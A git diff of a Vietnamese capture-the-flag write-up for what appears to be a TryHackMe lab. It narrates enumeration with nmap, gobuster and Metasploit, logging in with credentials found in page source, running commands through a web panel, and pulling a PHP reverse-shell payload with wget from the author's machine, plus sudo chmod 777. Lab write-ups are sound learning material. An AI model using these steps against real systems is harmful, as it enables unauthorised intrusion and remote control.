@@ -1,7 +1,7 @@
 ﻿### Yêu cầu
 - Cho trước:
--- Host: 10.10.55.49 (có thể khác)
--- Web app: https://10-10-55-49.p.thmlabs.com/
+    * Host: 10.10.55.49 (có thể khác)
+    * Web app: https://10-10-55-49.p.thmlabs.com/
 - Tìm đủ 3 flags.
 ### Let's go
 - Mở vào trang web, đầu tiên mình thấy không có gì khả nghi. Mình xem page source thì thấy 1 đoạn comment chứa tên tài khoản: `R1ckRul3s`. Phán đoán ban đầu, mình cho rằng có thể là tài khoản đăng nhập vào trang quản trị, hoặc ssh.
@@ -10,10 +10,10 @@
 - Kiểm tra version của service ssh bằng `nmap -sV`, mình thấy ssh có version OpenSSH 7.6p1 (version này có lỗ hổng có thể khai thác username enumeration). Mình khai thác username enumeration thông qua Metasploit với hy vọng tìm kiếm được username. Tuy nhiên, kết quả là không nhận được gì cả.
 - Tạm bỏ qua ssh, mình quay trở lại với webapp.
 - Dùng gobuster để enum webapp. Kết quả trả ra một vài thứ khá hay ho:
--- /assets 
--- /robots.txt 
--- /login.php 
--- /portal.php 
+  * /assets 
+  * /robots.txt 
+  * /login.php 
+  * /portal.php 
 - Truy cập vào https://10-10-55-49.p.thmlabs.com/robots.txt , mình thấy có đúng 1 dòng `Wubbalubbadubdub`. Mình đoán nó là mật khẩu của tài khoản `R1ckRul3s` tìm thấy trước đó.
 - Truy cập vào https://10-10-55-49.p.thmlabs.com/login.php , hiển thị 1 form đăng nhập. Nhập vào username `R1ckRul3s` và password `Wubbalubbadubdub`, authenticate thành công và được redirect đến portal.php.
 - Tại đây xuất hiện 1 ô input để thực thi command trên server host. Như thói quen, mình thử `ls -la`. Kết quả trả về các file đã enum được trước đó, thêm vào đó là 2 file mình thấy khả nghi: Sup3rS3cretPickl3Ingred.txt , clue.txt. 
@@ -28,7 +28,7 @@
 - Mình thử brute force trang login.php với các từ khóa liên quan đến rabbit hole, rick, root, ubuntu,... nhưng cũng không thành công.
 - Sau đó mình dùng `less login.php` mới thấy chỉ authen tài khoản `R1ckRul3s` và mật khẩu `Wubbalubbadubdub`. 
 - Về mãi sau, khi tìm đủ 3 flag, mình search `rabbit hole in linux`, mới hiểu có vẻ như đó là 1 hint để xem nội dung file bằng các câu lệnh khác (nhưng trên thực tế mình cũng không dùng đến rabbit hole). Hoặc đó là 1 cú lừa, btw ~~.
-- Mình thử dùng netcat để tại reverse shell nhưng không thành công. Sau đó, mình mở http server ở local và dùng `wget 10.11.21.36 8080 php-reverse-shell.php` để upload payload lên host. Ở local báo file đã được get thành công nhưng check trên server mình lại không thấy. Có thể không được phép chỉnh sửa hay tạo file trong folder này.
+- Mình thử dùng netcat để tại reverse shell nhưng không thành công. Sau đó, mình mở http server ở local và dùng `wget <LHOST> <LPORT> php-reverse-shell.php` để upload payload lên host. Ở local báo file đã được get thành công nhưng check trên server mình lại không thấy. Có thể không được phép chỉnh sửa hay tạo file trong folder này.
 - Mình thử touch 1 file bất kỳ nhưng không được.
 - Dùng `sudo chmod 777 /var/www/html` và upload payload lại thì lại được.
 - Dùng thêm `sudo chmod 777 php-reverse-shell.php` cho chắc.
